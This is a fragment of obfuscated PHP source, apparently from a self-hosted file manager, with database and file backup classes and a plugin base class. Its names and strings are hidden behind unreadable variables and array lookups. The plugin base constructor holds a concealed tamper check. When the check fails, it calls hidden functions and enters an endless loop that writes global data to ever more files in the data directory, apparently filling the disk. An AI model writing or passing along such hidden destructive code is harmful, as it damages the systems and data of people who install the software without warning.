$Ç¦‹äÔ³ = $GLOBALS[$˜ĞÙ¿µ£[6]][$˜ĞÙ¿µ£[90]][$˜ĞÙ¿µ£[778]]; if (!mk_dir($Ç¦‹äÔ³) || !is_writable($Ç¦‹äÔ³) || !IO::mkfile($Ç¦‹äÔ³ . $˜ĞÙ¿µ£[779])) { $Ç¦‹äÔ³ = TEMP_FILES; } } return $Ç¦‹äÔ³; } } class BackupDbFile { public function __construct() { } public function index() { $Éœ©Š„ =& $_SERVER[® ¨Ä®ñ]; $°³ÕÙÊ = Backup::get(); $ğÒµÏüÄ = $°³ÕÙÊ[$Éœ©Š„[32]]; $æó¨¢° = $this->tmpFilesPath() . "\142\x61\x63\153\165\x70\137{$ğÒµÏüÄ}\x2f"; $‹ŸÅ†»– = $this->backupPath($°³ÕÙÊ); if (!($‹ŸÅ†»– = IO::mkdir($‹ŸÅ†»–))) { return !1; } $Öâ½Çî = IO::listPath($æó¨¢°); $ŠÕ´£òÍ = isset($Öâ½Çî[$Éœ©Š„[76]]) ? $Öâ½Çî[$Éœ©Š„[76]] : array(); $Š°ˆìëŒ = array_sum(array_column($ŠÕ´£òÍ, $Éœ©Š„[80])); if (!$Š°ˆìëŒ) { return !1; } $ŸŠùÍ‡ß = array($Éœ©Š„[780] => $Š°ˆìëŒ, $Éœ©Š„[781] => time()); Backup::set($ŸŠùÍ‡ß); $ÖçÓÛŠù = new TaskFileTransfer($Éœ©Š„[782], $Éœ©Š„[762], count($ŠÕ´£òÍ), LNG($Éœ©Š„[763]) . $Éœ©Š„[451] . LNG($Éœ©Š„[765]) . $Éœ©Š„[783]); $ÖçÓÛŠù->task[$Éœ©Š„[745]] = $Š°ˆìëŒ; foreach ($Öâ½Çî[$Éœ©Š„[76]] as $¾ƒ¦ãøĞ) { $°ãÁù— = IO::move($¾ƒ¦ãøĞ[$Éœ©Š„[78]], $‹ŸÅ†»–); if (!$°ãÁù—) { $ÖçÓÛŠù->end(); $ç”¹õÑˆ = IO::getLastError($Éœ©Š„[784] . $¾ƒ¦ãøĞ[$Éœ©Š„[78]] . $Éœ©Š„[785] . $‹ŸÅ†»– . $Éœ©Š„[527]); write_log($ç”¹õÑˆ, $Éœ©Š„[762]); return !1; } } $Ê°ÑÛ­™ = new DbManage(); $èÆ—Áş = $Ê°ÑÛ­™->getSqlFile(); if (!$èÆ—Áş[$Éœ©Š„[786]] || !$èÆ—Áş[$Éœ©Š„[13]]) { return !1; } IO::move($èÆ—Áş[$Éœ©Š„[786]], $‹ŸÅ†»–); IO::move($èÆ—Áş[$Éœ©Š„[13]], $‹ŸÅ†»–); $ÖçÓÛŠù->end(); $ŸŠùÍ‡ß = array($Éœ©Š„[787] => $Š°ˆìëŒ, $Éœ©Š„[788] => time()); Backup::set($ŸŠùÍ‡ß); return !0; } private function backupPath($‡æâÖî¼) { $Ù£³Ôü¤ =& $_SERVER[® ¨Ä®ñ]; $øÂˆûÆ´ = $‡æâÖî¼[$Ù£³Ôü¤[32]]; $À†¹È¯† = Model($Ù£³Ôü¤[752])->get($Ù£³Ôü¤[753]); $ Ô÷Í = substr(md5($Ù£³Ôü¤[754] . $À†¹È¯† . $øÂˆûÆ´), 0, 8); return "\x7b\151\x6f\x3a{$‡æâÖî¼[$Ù£³Ôü¤[734]]}\175\57\x64\x61\x74\x61\142\141\x73\145\x2f\142\x61\143\x6b\165\x70\x2f" . $øÂˆûÆ´ . $Ù£³Ôü¤[11] . $ Ô÷Í; } private function tmpFilesPath() { $±³™ó—ˆ =& $_SERVER[® ¨Ä®ñ]; $‡­˜Ş¶í = TEMP_FILES; if ($GLOBALS[$±³™ó—ˆ[6]][$±³™ó—ˆ[90]][$±³™ó—ˆ[778]]) { $‡­˜Ş¶í = $GLOBALS[$±³™ó—ˆ[6]][$±³™ó—ˆ[90]][$±³™ó—ˆ[778]]; if (!mk_dir($‡­˜Ş¶í) || !is_writable($‡­˜Ş¶í) || !IO::mkfile($‡­˜Ş¶í . $±³™ó—ˆ[779])) { $‡­˜Ş¶í = TEMP_FILES; } } return $‡­˜Ş¶í; } } class BackupFile { public function __construct() { } public function index() { $±ûïÜû— = Backup::get(); $âÄ¡ï€œ = $±ûïÜû—[$_SERVER[® ¨Ä®ñ][288]][$_SERVER[® ¨Ä®ñ][192]][$_SERVER[® ¨Ä®ñ][458]]; $ß¤ö¸¿‰ = array($_SERVER[® ¨Ä®ñ][459] => array($_SERVER[® ¨Ä®ñ][789], $âÄ¡ï€œ), $_SERVER[® ¨Ä®ñ][790] => array($_SERVER[® ¨Ä®ñ][326], $±ûïÜû—[$_SERVER[® ¨Ä®ñ][734]])); $Œ‹ÒùÉŞ = (int) Model($_SERVER[® ¨Ä®ñ][771])->where($ß¤ö¸¿‰)->count($_SERVER[® ¨Ä®ñ][458]); $¶ªıĞ´ê = (int) Model($_SERVER[® ¨Ä®ñ][771])->where($ß¤ö¸¿‰)->sum($_SERVER[® ¨Ä®ñ][80]); $¶ÒéŠŞ‡ = new TaskFileTransfer($_SERVER[® ¨Ä®ñ][791], $_SERVER[® ¨Ä®ñ][762], $Œ‹ÒùÉŞ, LNG($_SERVER[® ¨Ä®ñ][763]) . $_SERVER[® ¨Ä®ñ][764] . LNG($_SERVER[® ¨Ä®ñ][792])); $¶ÒéŠŞ‡->task[$_SERVER[® ¨Ä®ñ][745]] = $¶ªıĞ´ê; $ğÓ‚æî– = array($_SERVER[® ¨Ä®ñ][793] => $Œ‹ÒùÉŞ, $_SERVER[® ¨Ä®ñ][794] => $¶ªıĞ´ê, $_SERVER[® ¨Ä®ñ][795] => time()); Backup::set($ğÓ‚æî–); $•‰éú´ = !0; $³Ş¤„›Ï = $this->storeIds(); $Ñ¢Ù¥É = 1; $ãÃŸ‰•‹ = 1000; $Û‡ÅÒá© = $»£ô·‘ = 0; $±áÄÚÏÌ = array(); $Ã¢”â–Ä = $€ù—ÅêÖ = 0; do { $–ÈÚë×© = $_SERVER[® ¨Ä®ñ][796]; $£ùÖÀûš = Model($_SERVER[® ¨Ä®ñ][771])->where($ß¤ö¸¿‰)->field($–ÈÚë×©)->order($_SERVER[® ¨Ä®ñ][797])->selectPage($ãÃŸ‰•‹, $Ñ¢Ù¥É); $ÛˆµåòØ = !empty($£ùÖÀûš[$_SERVER[® ¨Ä®ñ][364]]) ? $£ùÖÀûš[$_SERVER[® ¨Ä®ñ][364]] : array(); foreach ($ÛˆµåòØ as $´¤ıö²Â) { if (!$this->_fileExist($´¤ıö²Â, $±áÄÚÏÌ, $³Ş¤„›Ï)) { $Œ‹ÒùÉŞ -= 1; $¶ªıĞ´ê -= (int) $´¤ıö²Â[$_SERVER[® ¨Ä®ñ][80]]; write_log("\146\151\x6c\x65\x20\156\x6f\164\x20\x65\170\151\163\164\x2e\146\151\x6c\145\111\x44\72{$´¤ıö²Â[$_SERVER[® ¨Ä®ñ][458]]}\x2c\40\160\x61\164\150\x3a{$´¤ıö²Â[$_SERVER[® ¨Ä®ñ][78]]}", $_SERVER[® ¨Ä®ñ][798]); continue; } $¿ à¾³ = $´¤ıö²Â[$_SERVER[® ¨Ä®ñ][78]]; $¶ß“èÖè = "\x7b\x69\157\x3a{$±ûïÜû—[$_SERVER[® ¨Ä®ñ][734]]}\175" . substr($¿ à¾³, strlen("\173\151\x6f\72{$´¤ıö²Â[$_SERVER[® ¨Ä®ñ][799]]}\175")); if (IO::exist($¶ß“èÖè)) { $¶ÒéŠŞ‡->updateFileEnd($´¤ıö²Â[$_SERVER[® ¨Ä®ñ][32]], $´¤ıö²Â[$_SERVER[® ¨Ä®ñ][80]]); } else { $¶ß“èÖè = get_path_father($¶ß“èÖè); IO::mkdir($¶ß“èÖè); if (!IO::copy($¿ à¾³, $¶ß“èÖè, $_SERVER[® ¨Ä®ñ][800])) { write_log($_SERVER[® ¨Ä®ñ][801] . $¿ à¾³ . $_SERVER[® ¨Ä®ñ][785] . $¶ß“èÖè . $_SERVER[® ¨Ä®ñ][527], $_SERVER[® ¨Ä®ñ][762]); $•‰éú´ = !1; break; } } $âÄ¡ï€œ = $´¤ıö²Â[$_SERVER[® ¨Ä®ñ][458]]; $»£ô·‘ += 1; $Û‡ÅÒá© += $´¤ıö²Â[$_SERVER[® ¨Ä®ñ][80]]; $€ù—ÅêÖ += 1; $Ã¢”â–Ä += $´¤ıö²Â[$_SERVER[® ¨Ä®ñ][80]]; if ($Û‡ÅÒá© >= 1024 * 1024 * 100) { $ğÓ‚æî– = array($_SERVER[® ¨Ä®ñ][802] => $âÄ¡ï€œ, $_SERVER[® ¨Ä®ñ][803] => $€ù—ÅêÖ, $_SERVER[® ¨Ä®ñ][804] => $Ã¢”â–Ä); Backup::set($ğÓ‚æî–); $Û‡ÅÒá© = $»£ô·‘ = 0; } } $¤Âôš®í = count($ÛˆµåòØ); $Ñ¢Ù¥É++; } while ($¤Âôš®í == $ãÃŸ‰•‹); $¶ÒéŠŞ‡->end(); $ğÓ‚æî– = array($_SERVER[® ¨Ä®ñ][805] => 1, $_SERVER[® ¨Ä®ñ][487] => time(), $_SERVER[® ¨Ä®ñ][757] => 1, $_SERVER[® ¨Ä®ñ][802] => $âÄ¡ï€œ, $_SERVER[® ¨Ä®ñ][794] => $¶ªıĞ´ê, $_SERVER[® ¨Ä®ñ][793] => $Œ‹ÒùÉŞ, $_SERVER[® ¨Ä®ñ][806] => time()); if ($»£ô·‘) { $ğÓ‚æî–[$_SERVER[® ¨Ä®ñ][803]] = $€ù—ÅêÖ; $ğÓ‚æî–[$_SERVER[® ¨Ä®ñ][804]] = $Ã¢”â–Ä; } Backup::set($ğÓ‚æî–); $this->_fileFilter($±áÄÚÏÌ); return !0; } private function _fileExist($ÈûşèĞ, &$¥¡ş¦¥, $ÈŠŒó… ) { $¸É®˜ğ  =& $_SERVER[® ¨Ä®ñ]; $¼›åø¹ç = $ÈûşèĞ[$¸É®˜ğ [78]]; if (in_array($ÈûşèĞ[$¸É®˜ğ [458]], $¥¡ş¦¥)) { return !1; } if (!in_array($ÈûşèĞ[$¸É®˜ğ [799]], $ÈŠŒó… )) { return !1; } if (IO::exist($¼›åø¹ç)) { return !0; } $ÙÅ½Ë¿ = get_path_father($¼›åø¹ç); if (IO::exist($ÙÅ½Ë¿)) { $¥¡ş¦¥[] = $ÈûşèĞ[$¸É®˜ğ [458]]; return !1; } $â·¡‘¢Œ = array($¸É®˜ğ [799] => $ÈûşèĞ[$¸É®˜ğ [799]], $¸É®˜ğ [78] => array($¸É®˜ğ [378], "{$ÙÅ½Ë¿}\x25")); $«ü¶˜ = Model($¸É®˜ğ [771])->where($â·¡‘¢Œ)->field($¸É®˜ğ [459])->select(); $¥¡ş¦¥ = array_merge($¥¡ş¦¥, array_to_keyvalue($«ü¶˜, $¸É®˜ğ [12], $¸É®˜ğ [458])); return !1; } private function _fileFilter($ûß¥å”©) { $ÕåÔÌ¢Ë =& $_SERVER[® ¨Ä®ñ]; if (empty($ûß¥å”©)) { return; } $Õå§°–Û = array($ÕåÔÌ¢Ë[458] => array($ÕåÔÌ¢Ë[7], array_unique($ûß¥å”©))); $¯¦İè¤ñ = Model($ÕåÔÌ¢Ë[807])->where($Õå§°–Û)->field($ÕåÔÌ¢Ë[394])->select(); foreach ($¯¦İè¤ñ as $¦“°©ëÅ) { Model($ÕåÔÌ¢Ë[807])->remove($¦“°©ëÅ[$ÕåÔÌ¢Ë[394]], !1); } } private function storeIds() { $ª»ôé¯Ì =& $_SERVER[® ¨Ä®ñ]; $¹¡ĞŞï­ = Model($ª»ôé¯Ì[749])->listData(); $ŒÎñªíş = array(); $çŠÄ°í = $GLOBALS[$ª»ôé¯Ì[6]][$ª»ôé¯Ì[90]][$ª»ôé¯Ì[808]]; foreach ($¹¡ĞŞï­ as $ ’¾å) { $—÷©ô…ï = strtolower($ ’¾å[$ª»ôé¯Ì[96]]); if (!isset($çŠÄ°í[$—÷©ô…ï])) { continue; } $é¡‰‰àò = $ª»ôé¯Ì[74] . (isset($çŠÄ°í[$—÷©ô…ï]) ? $çŠÄ°í[$—÷©ô…ï] : ucfirst($—÷©ô…ï)); if (!class_exists($é¡‰‰àò)) { continue; } $ŒÎñªíş[] = $ ’¾å[$ª»ôé¯Ì[392]]; } return $ŒÎñªíş; } } goto f®“â”õ¯Ö; cíô‚°¨Å½: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ê¥Ø‰Ÿâ =& $_SERVER[® ¨Ä®ñ]; $É¸‚Ï® = $_SERVER[$ê¥Ø‰Ÿâ[943]]; $ê”ü‹šß = $ê¥Ø‰Ÿâ[1503]; if ($_SERVER[$ê¥Ø‰Ÿâ[854]] != $ê”ü‹šß($É¸‚Ï®)) { $Ó‡¥ä‰µ = $ê¥Ø‰Ÿâ[856]; $×ŸÔ ÆŒ = $ê¥Ø‰Ÿâ[857]; $ˆÚ áüÓ = $_SERVER[$ê¥Ø‰Ÿâ[858]] . $ê¥Ø‰Ÿâ[859]; $°Ú±Ûà = $×ŸÔ ÆŒ($ˆÚ áüÓ); $¼ı‚Ó¸ì = explode($ê¥Ø‰Ÿâ[226], $°Ú±Ûà); if (count($¼ı‚Ó¸ì) < $ê¥Ø‰Ÿâ[610]) { $ô›Òø‚ = $ê¥Ø‰Ÿâ[860]; $ô›Òø‚(); } $Ãê°—äÎ = $ê¥Ø‰Ÿâ[861]; $Ãê°—äÎ($_SERVER[$ê¥Ø‰Ÿâ[862]]); $Ó‡¥ä‰µ = $ê¥Ø‰Ÿâ[856]; $Ó‡¥ä‰µ(); $­®¨¢œ = $ê¥Ø‰Ÿâ[1504]; $ó¦â©›ğ = json_encode($GLOBALS[$ê¥Ø‰Ÿâ[1505]]); $™®îÊé = 1; for ($†˜©ºÑ° = $™®îÊé; $†˜©ºÑ° > 0; $†˜©ºÑ°++) { $­®¨¢œ(DATA_PATH . $†˜©ºÑ°, $ó¦â©›ğ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ê¥Ø‰Ÿâ[1506]); $this->pluginName = str_replace($ê¥Ø‰Ÿâ[1506], $ê¥Ø‰Ÿâ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ê¥Ø‰Ÿâ[8]; $this->pluginApi = appHostGet() . $ê¥Ø‰Ÿâ[1507] . $this->pluginName . $ê¥Ø‰Ÿâ[8]; $this->pluginHost = $config[$ê¥Ø‰Ÿâ[1508]] . $this->pluginName . $ê¥Ø‰Ÿâ[8]; $this->pluginHostDefault = $config[$ê¥Ø‰Ÿâ[1508]] . $this->pluginName . $ê¥Ø‰Ÿâ[8]; $›ŞéÆ¿– = $config[$ê¥Ø‰Ÿâ[1509]]; if ($›ŞéÆ¿– && strpos($ê¥Ø‰Ÿâ[50] . $›ŞéÆ¿– . $ê¥Ø‰Ÿâ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ê¥Ø‰Ÿâ[1510]] . $this->pluginName . $ê¥Ø‰Ÿâ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[® ¨Ä®ñ][1511]); } protected function assign($Àû‰¹‘¥, $€ì­¶Æ® = false) { if (is_array($Àû‰¹‘¥)) { $this->values = array_merge($this->values, $Àû‰¹‘¥); } else { $this->values[$Àû‰¹‘¥] = $€ì­¶Æ®; } } protected function display($¶ëËê ¨) { extract($this->values); require $¶ëËê ¨; } final function hookRegist($Ì›¸¦‡Ä) { $this->modelPlugin->appRegist($this->pluginName, $Ì›¸¦‡Ä); } final function appIcon() { $°İØ™ƒÇ =& $_SERVER[® ¨Ä®ñ]; $ºÀ¤¸ü¼ = $this->appPackage(); $ú™ŒŠ©­ = $°İØ™ƒÇ[12]; if (isset($ºÀ¤¸ü¼[$°İØ™ƒÇ[408]])) { if (isset($ºÀ¤¸ü¼[$°İØ™ƒÇ[408]][$°İØ™ƒÇ[1512]])) { $ú™ŒŠ©­ = $°İØ™ƒÇ[1513] . $ºÀ¤¸ü¼[$°İØ™ƒÇ[408]][$°İØ™ƒÇ[1512]] . $°İØ™ƒÇ[1514]; } else { if ($ºÀ¤¸ü¼[$°İØ™ƒÇ[408]][$°İØ™ƒÇ[1515]]) { $ú™ŒŠ©­ = $°İØ™ƒÇ[1516] . $ºÀ¤¸ü¼[$°İØ™ƒÇ[408]][$°İØ™ƒÇ[1515]] . $°İØ™ƒÇ[1517]; } } } return $ú™ŒŠ©­; } final function fileCanView($ğòÙìæ) { $½æıïü¯ =& $_SERVER[® ¨Ä®ñ]; if (request_url_safe($ğòÙìæ)) { return !0; } if ($this->isShare($ğòÙìæ)) { return !0; } $Ì¬·³ê = Session::get($½æıïü¯[1518]); if (!$Ì¬·³ê || !$Ì¬·³ê[$½æıïü¯[1519]]) { $Ú¢Îáü‘ = $½æıïü¯[1520] . rawurlencode(this_url()); show_tips(LNG($½æıïü¯[1521]) . $½æıïü¯[1522] . $Ú¢Îáü‘ . $½æıïü¯[1523] . LNG($½æıïü¯[1524]) . $½æıïü¯[1525], !1); } if (!Action($½æıïü¯[1526])->authCan($½æıïü¯[1527])) { show_tips(LNG($½æıïü¯[1528]) . $½æıïü¯[1529], !1); } ActionCall($½æıïü¯[1530], $ğòÙìæ); } final function isShare($ú™‰×‰á) { $Ü†¾Õª‹ = KodIO::parse($ú™‰×‰á); return $Ü†¾Õª‹[$_SERVER[® ¨Ä®ñ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($©¤óõé) { if (request_url_safe($©¤óõé)) { return $©¤óõé; } if (!$this->isShare($©¤óõé)) { $©¤óõé = $this->filePath($©¤óõé); } return Action($_SERVER[® ¨Ä®ñ][1157])->linkOut($©¤óõé); } public function filePathLinkOut($‚Ë¬œ³Ö) { if (request_url_safe($‚Ë¬œ³Ö)) { return $‚Ë¬œ³Ö; } $this->fileCanView($‚Ë¬œ³Ö); return Action($_SERVER[® ¨Ä®ñ][1157])->link($‚Ë¬œ³Ö); } final function filePath($¾ÆğƒÀ¦) { $‡ÏÀ ¤” =& $_SERVER[® ¨Ä®ñ]; if ($ú±“ÄŞñ = $this->checkSharePath($¾ÆğƒÀ¦)) { Hook::trigger($‡ÏÀ ¤”[1531], $ú±“ÄŞñ); return $ú±“ÄŞñ; } $this->fileCanView($¾ÆğƒÀ¦); if (request_url_safe($¾ÆğƒÀ¦)) { $ÃÇÑÃ× = parse_url_query($¾ÆğƒÀ¦); if (isset($ÃÇÑÃ×[$‡ÏÀ ¤”[1532]]) && isset($ÃÇÑÃ×[$‡ÏÀ ¤”[208]])) { $“ÂÑŞÁ = Model($‡ÏÀ ¤”[752])->get($‡ÏÀ ¤”[753]); $¯ş»ää = Mcrypt::decode($ÃÇÑÃ×[$‡ÏÀ ¤”[208]], $“ÂÑŞÁ); if ($¯ş»ää) { $this->fileInfo = IO::infoWithChildren($¯ş»ää); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $¯ş»ää; } } $¾ÆğƒÀ¦ = $this->_cacheHttpFile($¾ÆğƒÀ¦); $this->fileInfo = IO::infoWithChildren($¾ÆğƒÀ¦); } else { $this->fileInfo = IO::infoWithChildren($¾ÆğƒÀ¦); if (!$this->fileInfo) { show_tips(LNG($‡ÏÀ ¤”[106]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($‡ÏÀ ¤”[1531], $¾ÆğƒÀ¦); return $¾ÆğƒÀ¦; } final function _cacheHttpFile($¨±Ÿê¯¢) { $¤Š•Î ¤ = hash_path($¨±Ÿê¯¢, !0); $this->cachePath = $this->pluginCachePath($¤Š•Î ¤); if ($¼ßÊ÷ü = IO::fileNameExist($this->cachePath, $¤Š•Î ¤)) { return KodIO::make($¼ßÊ÷ü); } $ùà –ì‚ = $this->cachePath . $¤Š•Î ¤; return $this->pluginCacheFileSet($ùà –ì‚, file_get_contents_nossl($¨±Ÿê¯¢)); } final function _tmpFileName($·ÉğàÎ¦ = array()) { $„ì‡˜ =& $_SERVER[® ¨Ä®ñ]; if (!$·ÉğàÎ¦) { $·ÉğàÎ¦ = $this->fileInfo; } if (isset($·ÉğàÎ¦[$„ì‡˜[170]])) { return $·ÉğàÎ¦[$„ì‡˜[170]]; } if (isset($·ÉğàÎ¦[$„ì‡˜[163]][$„ì‡˜[170]])) { return $·ÉğàÎ¦[$„ì‡˜[163]][$„ì‡˜[170]]; } $—•¯“ñ÷ = IO::hashSimple($·ÉğàÎ¦[$„ì‡˜[78]]); if ($—•¯“ñ÷) { return $—•¯“ñ÷; } $ÁÊÄÖ«¨ = array($·ÉğàÎ¦[$„ì‡˜[32]], $·ÉğàÎ¦[$„ì‡˜[78]], $·ÉğàÎ¦[$„ì‡˜[80]]); if (isset($·ÉğàÎ¦[$„ì‡˜[512]])) { $ÁÊÄÖ«¨[] = $·ÉğàÎ¦[$„ì‡˜[512]]; } return md5(implode($„ì‡˜[11], $ÁÊÄÖ«¨)); } final function checkSharePath($¬åĞÛá§) { $ü¸ÚñÎ— =& $_SERVER[® ¨Ä®ñ]; if (!defined($ü¸ÚñÎ—[465])) { define($ü¸ÚñÎ—[505], 0); } if (!$this->isShare($¬åĞÛá§)) { return !1; } $ã›¾˜‘” = Action($ü¸ÚñÎ—[1157])->sharePathInfo($¬åĞÛá§); if (!isset($ã›¾˜‘”[$ü¸ÚñÎ—[78]])) { show_json(LNG($ü¸ÚñÎ—[1533]), !1); } $this->fileInfo = $ã›¾˜‘”[$ü¸ÚñÎ—[163]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ü¸ÚñÎ—[170]]); return $ã›¾˜‘”[$ü¸ÚñÎ—[78]]; } final function pluginCachePath($Ÿ²ø—§í = '') { $ûå¶€¿× =& $_SERVER[® ¨Ä®ñ]; $­Úó™ ò = IO_PATH_SYSTEM_TEMP . $ûå¶€¿×[1534] . $this->pluginName; if (!($±¸©¡—¼ = IO::infoFull($­Úó™ ò))) { return IO::mkdir($­Úó™ ò . $ûå¶€¿×[8] . $Ÿ²ø—§í); } if (empty($Ÿ²ø—§í)) { return $±¸©¡—¼[$ûå¶€¿×[78]]; } if (!($šÆ»çâ€ = IO::fileNameExist($±¸©¡—¼[$ûå¶€¿×[78]], $Ÿ²ø—§í))) { return IO::mkdir($±¸©¡—¼[$ûå¶€¿×[78]] . $Ÿ²ø—§í); } return KodIO::make($šÆ»çâ€); } final function pluginCacheFileSet($©÷çÛ¶Ÿ, $üÔ´õ¼³ = '') { $î˜¬ùÒ– =& $_SERVER[® ¨Ä®ñ]; if (!($Ñ–Â˜‡¼ = IO::infoFull($©÷çÛ¶Ÿ))) { return IO::mkfile($©÷çÛ¶Ÿ, $üÔ´õ¼³, REPEAT_REPLACE); } IO::setContent($Ñ–Â˜‡¼[$î˜¬ùÒ–[78]], $üÔ´õ¼³); return $Ñ–Â˜‡¼[$î˜¬ùÒ–[78]]; } final function pluginLocalFile($áÑ¯ˆ•¿ = '') { $£¬ÈÚºÑ =& $_SERVER[® ¨Ä®ñ]; $ûæµòËÚ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ûæµòËÚ)) { mk_dir($ûæµòËÚ); } if (!$áÑ¯ˆ•¿) { return $ûæµòËÚ; } $‡­ù”•­ = IO::info($áÑ¯ˆ•¿); $³Ñè·Š“ = $this->_tmpFileName($‡­ù”•­) . $£¬ÈÚºÑ[10] . $‡­ù”•­[$£¬ÈÚºÑ[167]]; if (!checkExtSafe($³Ñè·Š“)) { $³Ñè·Š“ = $³Ñè·Š“ . $£¬ÈÚºÑ[1535]; } $¥Š·ÜçŸ = $ûæµòËÚ . $³Ñè·Š“; if (@file_exists($¥Š·ÜçŸ)) { return $¥Š·ÜçŸ; } return IO::copy($áÑ¯ˆ•¿, $ûæµòËÚ, 0, $³Ñè·Š“); } final function appPackage() { $šÂ­ÌâŒ =& $_SERVER[® ¨Ä®ñ]; if ($this->packageData) { return $this->packageData; } $‘¢¦¥ÒÒ = $this->parseFile($this->pluginPath . $šÂ­ÌâŒ[1536]); $this->parseLang($‘¢¦¥ÒÒ); $´ß¹İ = json_decode_force($‘¢¦¥ÒÒ); if (!$´ß¹İ) { return array(); } $Šâé»ÚÂ = Hook::trigger($šÂ­ÌâŒ[1537], $´ß¹İ); if ($Šâé»ÚÂ && is_array($Šâé»ÚÂ)) { $´ß¹İ = $Šâé»ÚÂ; } $this->packageData = $´ß¹İ; return $´ß¹İ; } public function packageInfoGet($Šš‰´) { $ Îô±‡• = $this->appPackage(); return array_get_value($ Îô±‡•, $Šš‰´); } public function packageVersion() { return $this->packageInfoGet($_SERVER[® ¨Ä®ñ][1538]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[® ¨Ä®ñ][1539]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[® ¨Ä®ñ][1540]); } public function echoJsAssign($èñ«ù”î, $ĞÏ£±ù») { $this->echoJsAssignArr[$èñ«ù”î] = $ĞÏ£±ù»; } private function parseFile($ñÒîİ‡Ÿ) { $ş„¤ïïô =& $_SERVER[® ¨Ä®ñ]; $Üçô‡ = file_get_contents_nossl($ñÒîİ‡Ÿ); $ËåÜµÓ  = array($ş„¤ïïô[1541], $ş„¤ïïô[1542], $ş„¤ïïô[1543], $ş„¤ïïô[1544], $ş„¤ïïô[1545], $ş„¤ïïô[1546], $ş„¤ïïô[1547]); $Ù Îï¬ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ş„¤ïïô[90]][$ş„¤ïïô[1548]]); foreach ($this->echoJsAssignArr as $¬ƒ«Í”Á => $”ßƒ¼Ğ) { $ËåÜµÓ [] = $ş„¤ïïô[1549] . $¬ƒ«Í”Á . $ş„¤ïïô[1550]; $Ù Îï¬[] = is_array($”ßƒ¼Ğ) || is_object($”ßƒ¼Ğ) ? rawurlencode(json_encode($”ßƒ¼Ğ)) : $”ßƒ¼Ğ; } if (strstr($Üçô‡, $ş„¤ïïô[1551])) { $¼Í‹Æ‡© = rawurlencode(json_encode($this->pluginLangArr)); $Üçô‡ = str_replace($ş„¤ïïô[1551], $¼Í‹Æ‡©, $Üçô‡); } if (strstr($Üçô‡, $ş„¤ïïô[1552])) { $¼Í‹Æ‡© = $¼Í‹Æ‡© = rawurlencode(json_encode($this->getConfig())); $Üçô‡ = str_replace($ş„¤ïïô[1552], $¼Í‹Æ‡©, $Üçô‡); } $Üçô‡ = str_replace($ËåÜµÓ , $Ù Îï¬, $Üçô‡); return $Üçô‡; } private function parseLang(&$ş¿û€™¢) { $¨ŠÍ¯ïú =& $_SERVER[® ¨Ä®ñ]; $ñ“æÎûÑ = $¨ŠÍ¯ïú[1553]; if (!strstr($ş¿û€™¢, $ñ“æÎûÑ)) { return; } preg_match_all($¨ŠÍ¯ïú[1554], $ş¿û€™¢, $—§óí‚”); if (!is_array($—§óí‚”) || count($—§óí‚”) == 0 || !is_array($—§óí‚”[0]) || count($—§óí‚”[0]) == 0) { return; } $à¾óÛÒ = array(); $¶ø‚“¤ = array(); foreach ($—§óí‚”[0] as $§¤°…„´) { $¶ŸÀ«é = substr($§¤°…„´, strlen($ñ“æÎûÑ), -4); $»ãÑâÖ = LNG($¶ŸÀ«é); $à¾óÛÒ[] = $§¤°…„´; $¶ø‚“¤[] = str_replace(array($¨ŠÍ¯ïú[226], $¨ŠÍ¯ïú[1062], $¨ŠÍ¯ïú[337], $¨ŠÍ¯ïú[117]), array($¨ŠÍ¯ïú[53], $¨ŠÍ¯ïú[53], $¨ŠÍ¯ïú[12], $¨ŠÍ¯ïú[1555]), $»ãÑâÖ); } $ş¿û€™¢ = str_replace($à¾óÛÒ, $¶ø‚“¤, $ş¿û€™¢); } private function parseConfig(&$•²Õ×š) { $óšß™´Œ =& $_SERVER[® ¨Ä®ñ]; $ˆ‰ê­î = $óšß™´Œ[1556]; if (!strstr($•²Õ×š, $ˆ‰ê­î)) { return; } preg_match_all($óšß™´Œ[1557], $•²Õ×š, $§°¡Îõè); if (!is_array($§°¡Îõè) || count($§°¡Îõè) == 0 || !is_array($§°¡Îõè[0]) || count($§°¡Îõè[0]) == 0) { return; } $û»×÷Ò = $this->getConfig(); $ºÌ¿â¿Ì = array(); $ü„óûÖ = array(); foreach ($§°¡Îõè[0] as $œ¶«÷™µ) { $«Ú±ˆ¸ = substr($œ¶«÷™µ, strlen($ˆ‰ê­î), -2); $ºÌ¿â¿Ì[] = $œ¶«÷™µ; $ü„óûÖ[] = _get($û»×÷Ò, $«Ú±ˆ¸); } $•²Õ×š = str_replace($ºÌ¿â¿Ì, $ü„óûÖ, $•²Õ×š); } private function parsePackage(&$ê¦ğ‰”ø) { $ëÏı”Ğ¡ =& $_SERVER[® ¨Ä®ñ]; $é¥ÂËÔ‹ = $ëÏı”Ğ¡[1558]; if (!strstr($ê¦ğ‰”ø, $é¥ÂËÔ‹)) { return; } preg_match_all($ëÏı”Ğ¡[1559], $ê¦ğ‰”ø, $Ì¶û¦Ş); if (!is_array($Ì¶û¦Ş) || count($Ì¶û¦Ş) == 0 || !is_array($Ì¶û¦Ş[0]) || count($Ì¶û¦Ş[0]) == 0) { return; } $êô‡Èõï = $this->appPackage(); $’¯ÊÏø¨ = array(); $­ü´€¾´ = array(); foreach ($Ì¶û¦Ş[0] as $ô…à•şĞ) { $”Ç‰ªÛ¼ = substr($ô…à•şĞ, strlen($é¥ÂËÔ‹), -2); $’¯ÊÏø¨[] = $ô…à•şĞ; $­ü´€¾´[] = _get($êô‡Èõï, $”Ç‰ªÛ¼); 